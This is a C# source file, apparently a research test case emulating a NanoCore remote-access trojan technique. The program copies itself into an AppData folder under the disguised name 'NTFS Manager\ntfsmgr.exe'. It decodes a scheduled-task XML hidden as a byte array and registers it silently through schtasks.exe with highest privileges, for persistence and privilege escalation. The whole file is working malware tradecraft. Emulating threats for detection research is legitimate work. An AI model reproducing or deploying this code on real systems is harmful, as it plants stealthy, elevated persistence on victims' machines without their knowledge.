//Author: Shaddy43

ï»¿using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace NanoCore_testcase9
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Run task command: schtasks.exe /run /tn "NTFS Manager"
            //For triggering high privileged scheduled task
            //NanoCore use it for Privilege Escalation. Initially the malware executed with admin privileges saves a scheduled task which could be executed anytime to get higher privileges.
            //Execute with admin privileges first time.

            //copying malware (itself) in appdata
            Guid guid = GetGUID();
            string directory = "NTFS Manager\\ntfsmgr.exe";
            string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string full_path = appDataFolderPath + "\\" + guid.ToString() + "\\" + directory;    
            string task = "NTFS Manager";

            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(full_path));
                File.Copy(Assembly.GetExecutingAssembly().Location, full_path);

            }   catch(Exception ex)
            {
                //Console.WriteLine("File Already Exists...");
                Console.WriteLine(ex.Message);
            }

            //decoding the task configuration
            string @string = Encoding.UTF8.GetString(GetUACControlData());
            if (!string.Equals(Assembly.GetExecutingAssembly().Location, full_path, StringComparison.InvariantCultureIgnoreCase))
            {
                string task_config = @string.Replace("#EXECUTABLEPATH", full_path); //replacing the path in xml config for task scheduler
                if (SetTask(task, task_config, 10000))
                {
                    Console.WriteLine("Task Added Successfully...!!!");
                }
                else
                {
                    Console.WriteLine("Task Not Added...!!!");
                    Environment.Exit(1);
                }
            }
            else 
            {
                Console.WriteLine("TASK EXECUTED FROM SCHEDULED TASK");
                Thread.Sleep(3000);
                Environment.Exit(0);
            }
        }

        public static Guid GetGUID()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            Guid result = new Guid(((GuidAttribute)assembly.GetCustomAttributes(typeof(GuidAttribute), false)[0]).Value);
            return result;
        }

        public static bool SetTask(string task, string text, int duration) 
        {
            try
            {
                //creating a temporary task config xml file
                string tempFileName = Path.GetTempFileName();
                File.WriteAllText(tempFileName, text);

                //scheduling task
                string task_cmd = string.Format("/create /f /tn \"{0}\" /xml \"{1}\"", task, tempFileName);
                ProcessStartInfo startInfo = SetProcessInfo("schtasks.exe", task_cmd);
                Process process = Process.Start(startInfo);

                bool result = false;
                if (process.WaitForExit(duration))
                {
                    result = (process.ExitCode == 0);
                }

                File.Delete(tempFileName); //delete temporary task configuration file
                return result;
            }
            catch (Exception exception_)
            {
                Console.WriteLine(exception_ + ":CreateScheduledTask");
            }
            return false;
        }

        private static ProcessStartInfo SetProcessInfo(string process, string info)
        {
            return new ProcessStartInfo(process, info)
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
        }

        public static byte[] GetUACControlData() {
        
            return new byte[] { 0x3c, 0x3f, 0x78, 0x6d, 0x6c, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22, 0x20, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3d, 0x22, 0x55, 0x54, 0x46, 0x2d, 0x31, 0x36, 0x22, 0x3f, 0x3e, 0x0a, 0x3c, 0x54, 0x61, 0x73, 0x6b, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x32, 0x22, 0x20, 0x78, 0x6d, 0x6c, 0x6e, 0x73, 0x3d, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x73, 0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2e, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x2f, 0x32, 0x30, 0x30, 0x34, 0x2f, 0x30, 0x32, 0x2f, 0x6d, 0x69, 0x74, 0x2f, 0x74, 0x61, 0x73, 0x6b, 0x22, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x20, 0x2f, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x54, 0x72, 0x69, 0x67, 0x67, 0x65, 0x72, 0x73, 0x20, 0x2f, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x50, 0x72, 0x69, 0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x50, 0x72, 0x69, 0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c, 0x20, 0x69, 0x64, 0x3d, 0x22, 0x41, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x22, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x54, 0x79, 0x70, 0x65, 0x3e, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x3c, 0x2f, 0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x54, 0x79, 0x70, 0x65, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x52, 0x75, 0x6e, 0x4c, 0x65, 0x76, 0x65, 0x6c, 0x3e, 0x48, 0x69, 0x67, 0x68, 0x65, 0x73, 0x74, 0x41, 0x76, 0x61, 0x69, 0x6c, 0x61, 0x62, 0x6c, 0x65, 0x3c, 0x2f, 0x52, 0x75, 0x6e, 0x4c, 0x65, 0x76, 0x65, 0x6c, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x2f, 0x50, 0x72, 0x69, 0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x2f, 0x50, 0x72, 0x69, 0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x65, 0x49, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x63, 0x65, 0x73, 0x50, 0x6f, 0x6c, 0x69, 0x63, 0x79, 0x3e, 0x50, 0x61, 0x72, 0x61, 0x6c, 0x6c, 0x65, 0x6c, 0x3c, 0x2f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x65, 0x49, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x63, 0x65, 0x73, 0x50, 0x6f, 0x6c, 0x69, 0x63, 0x79, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x44, 0x69, 0x73, 0x61, 0x6c, 0x6c, 0x6f, 0x77, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x66, 0x4f, 0x6e, 0x42, 0x61, 0x74, 0x74, 0x65, 0x72, 0x69, 0x65, 0x73, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x44, 0x69, 0x73, 0x61, 0x6c, 0x6c, 0x6f, 0x77, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x66, 0x4f, 0x6e, 0x42, 0x61, 0x74, 0x74, 0x65, 0x72, 0x69, 0x65, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x53, 0x74, 0x6f, 0x70, 0x49, 0x66, 0x47, 0x6f, 0x69, 0x6e, 0x67, 0x4f, 0x6e, 0x42, 0x61, 0x74, 0x74, 0x65, 0x72, 0x69, 0x65, 0x73, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x53, 0x74, 0x6f, 0x70, 0x49, 0x66, 0x47, 0x6f, 0x69, 0x6e, 0x67, 0x4f, 0x6e, 0x42, 0x61, 0x74, 0x74, 0x65, 0x72, 0x69, 0x65, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x48, 0x61, 0x72, 0x64, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x3e, 0x74, 0x72, 0x75, 0x65, 0x3c, 0x2f, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x48, 0x61, 0x72, 0x64, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x53, 0x74, 0x61, 0x72, 0x74, 0x57, 0x68, 0x65, 0x6e, 0x41, 0x76, 0x61, 0x69, 0x6c, 0x61, 0x62, 0x6c, 0x65, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x53, 0x74, 0x61, 0x72, 0x74, 0x57, 0x68, 0x65, 0x6e, 0x41, 0x76, 0x61, 0x69, 0x6c, 0x61, 0x62, 0x6c, 0x65, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x52, 0x75, 0x6e, 0x4f, 0x6e, 0x6c, 0x79, 0x49, 0x66, 0x4e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x41, 0x76, 0x61, 0x69, 0x6c, 0x61, 0x62, 0x6c, 0x65, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x52, 0x75, 0x6e, 0x4f, 0x6e, 0x6c, 0x79, 0x49, 0x66, 0x4e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x41, 0x76, 0x61, 0x69, 0x6c, 0x61, 0x62, 0x6c, 0x65, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x49, 0x64, 0x6c, 0x65, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x53, 0x74, 0x6f, 0x70, 0x4f, 0x6e, 0x49, 0x64, 0x6c, 0x65, 0x45, 0x6e, 0x64, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x53, 0x74, 0x6f, 0x70, 0x4f, 0x6e, 0x49, 0x64, 0x6c, 0x65, 0x45, 0x6e, 0x64, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x4f, 0x6e, 0x49, 0x64, 0x6c, 0x65, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x4f, 0x6e, 0x49, 0x64, 0x6c, 0x65, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x2f, 0x49, 0x64, 0x6c, 0x65, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x53, 0x74, 0x61, 0x72, 0x74, 0x4f, 0x6e, 0x44, 0x65, 0x6d, 0x61, 0x6e, 0x64, 0x3e, 0x74, 0x72, 0x75, 0x65, 0x3c, 0x2f, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x53, 0x74, 0x61, 0x72, 0x74, 0x4f, 0x6e, 0x44, 0x65, 0x6d, 0x61, 0x6e, 0x64, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x45, 0x6e, 0x61, 0x62, 0x6c, 0x65, 0x64, 0x3e, 0x74, 0x72, 0x75, 0x65, 0x3c, 0x2f, 0x45, 0x6e, 0x61, 0x62, 0x6c, 0x65, 0x64, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x48, 0x69, 0x64, 0x64, 0x65, 0x6e, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x48, 0x69, 0x64, 0x64, 0x65, 0x6e, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x52, 0x75, 0x6e, 0x4f, 0x6e, 0x6c, 0x79, 0x49, 0x66, 0x49, 0x64, 0x6c, 0x65, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x52, 0x75, 0x6e, 0x4f, 0x6e, 0x6c, 0x79, 0x49, 0x66, 0x49, 0x64, 0x6c, 0x65, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x57, 0x61, 0x6b, 0x65, 0x54, 0x6f, 0x52, 0x75, 0x6e, 0x3e, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3c, 0x2f, 0x57, 0x61, 0x6b, 0x65, 0x54, 0x6f, 0x52, 0x75, 0x6e, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x54, 0x69, 0x6d, 0x65, 0x4c, 0x69, 0x6d, 0x69, 0x74, 0x3e, 0x50, 0x54, 0x30, 0x53, 0x3c, 0x2f, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x54, 0x69, 0x6d, 0x65, 0x4c, 0x69, 0x6d, 0x69, 0x74, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x50, 0x72, 0x69, 0x6f, 0x72, 0x69, 0x74, 0x79, 0x3e, 0x34, 0x3c, 0x2f, 0x50, 0x72, 0x69, 0x6f, 0x72, 0x69, 0x74, 0x79, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x2f, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x20, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x3d, 0x22, 0x41, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x22, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x45, 0x78, 0x65, 0x63, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x3e, 0x22, 0x23, 0x45, 0x58, 0x45, 0x43, 0x55, 0x54, 0x41, 0x42, 0x4c, 0x45, 0x50, 0x41, 0x54, 0x48, 0x22, 0x3c, 0x2f, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x41, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x3e, 0x24, 0x28, 0x41, 0x72, 0x67, 0x30, 0x29, 0x3c, 0x2f, 0x41, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x3e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x2f, 0x45, 0x78, 0x65, 0x63, 0x3e, 0x0a, 0x20, 0x20, 0x3c, 0x2f, 0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x3e, 0x0a, 0x3c, 0x2f, 0x54, 0x61, 0x73, 0x6b, 0x3e, 0x0a };
        }
    }
}
